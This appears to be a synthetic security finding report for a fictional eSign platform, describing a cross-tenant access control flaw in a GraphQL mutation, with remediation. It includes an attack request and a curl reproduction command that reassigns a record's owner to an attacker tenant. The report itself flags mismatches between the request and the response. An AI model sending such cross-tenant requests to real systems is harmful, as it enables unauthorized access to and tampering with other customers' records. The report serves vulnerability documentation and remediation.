# Security Analysis Report
**System:** SignFlow eSign Platform
**Domain:** Document Signing / eSign
**Example ID:** GQL-0297
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.2 | Metadata/attribute side-channel via `updateResource` — attacker from `tenant-8613` reads and modifies eSign records owned by `tenant-b3a7` |

---

## Finding 1 — BAC: Metadata/Attribute Side-Channel (Pattern 2.2)

### Summary
The `updateResource` mutation on SignFlow eSign Platform (`api.signflow-esign-platf.example.com`) accepts an arbitrary resource ID and modifies ownership attributes (`ownerId`) without verifying the caller's JWT `tenantId` matches the target resource's `tenantId`. Per §5.0 Pattern 2.2, even partial metadata exposure (existence of records, status fields) constitutes a side-channel. The Redis cache is keyed by `resourceId` only (no tenant dimension), amplifying the risk.

**Context.txt inconsistency (documented):** The HAR request uses the `updateResource` mutation (write operation), while §5.0 describes Pattern 2.2 as metadata/attribute side-channel (typically a read-side pattern). The response JSON key is `getResource` (INCONSISTENT with `updateResource`). The HAR (§6.0) is the primary evidence; the write mutation demonstrates unauthorized attribute modification of cross-tenant records.

**Note on `x-request-id`:** This appears as a *response* header (`"x-request-id": "req-8613b3a7"`). It is server-assigned and must NOT be sent as a request header.

**Pattern:** 2.2 — Metadata/attribute side-channel (BAC)
**Affected resolver:** `updateResource`
**Affected endpoint:** `POST https://api.signflow-esign-platf.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (attacker JWT: `tenant-8613`, modifying resource of `tenant-b3a7`)**
```
POST https://api.signflow-esign-platf.example.com/graphql
authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
content-type: application/json
x-tenant-id: tenant-8613

{"query": "query VulnerableOp { updateResource(id: \"R-2297\", input: {status: \"approved\", ownerId: \"attacker-8613b3a7\"}) { resourceId status } }"}
```

**Response — Cross-Tenant eSign Resource Returned**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-b3a7",
      "ownerId": "other-user-8613b3a7",
      "data": {
        "sensitiveField": "CONFIDENTIAL-8613b3a7",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
*`x-request-id: req-8613b3a7` — server-assigned response header, confirms cross-tenant access.*

### Steps to Reproduce
```bash
curl -s -X POST "https://api.signflow-esign-platf.example.com/graphql" \
  -H "authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "content-type: application/json" \
  -H "x-tenant-id: tenant-8613" \
  -d '{"query": "query VulnerableOp { updateResource(id: \"R-2297\", input: {status: \"approved\", ownerId: \"attacker-8613b3a7\"}) { resourceId status } }"}'
# Vulnerable: tenantId: tenant-b3a7 returned for tenant-8613 caller; metadata and ownerId exposed
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Validate `resource.tenantId === jwt.tenantId` before any write in `updateResource`.
2. Remove `ownerId` and `tenantId` from writable input fields.
3. Key Redis cache on `tenantId:resourceId` composite, not `resourceId` alone.
